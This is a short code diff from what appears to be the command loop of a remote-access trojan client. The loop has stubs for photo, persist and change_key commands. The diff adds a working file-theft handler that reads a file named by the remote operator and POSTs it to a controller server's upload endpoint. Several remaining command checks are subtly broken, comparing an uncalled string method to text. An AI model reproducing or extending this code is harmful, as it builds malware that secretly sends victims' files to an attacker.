@@ -176,12 +176,21 @@ while True:
                 pass
             if command.strip == "photo":
                 pass
-            if command.strip == "screenshot":
-                pass
             if command.strip == "upload":
                 pass
-            if command.strip == "download":
-                pass
+            if command.startswith("download"):
+                _, file_path = command.split(" ", 1)
+                full_file_path = os.path.join(current_directory,file_path)
+                if os.path.exists(full_file_path):
+                    print(full_file_path)
+                try:
+                    with open(full_file_path, 'rb') as file:
+                        files = {'file': (os.path.basename(full_file_path), file)}
+                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files)
+                        print(response.text)
+                except Exception as e:
+                    print(f"Error sending file: {e}")
+                command = ""
             if command.strip == "persist":
                 pass
             if command.strip == "change_key":
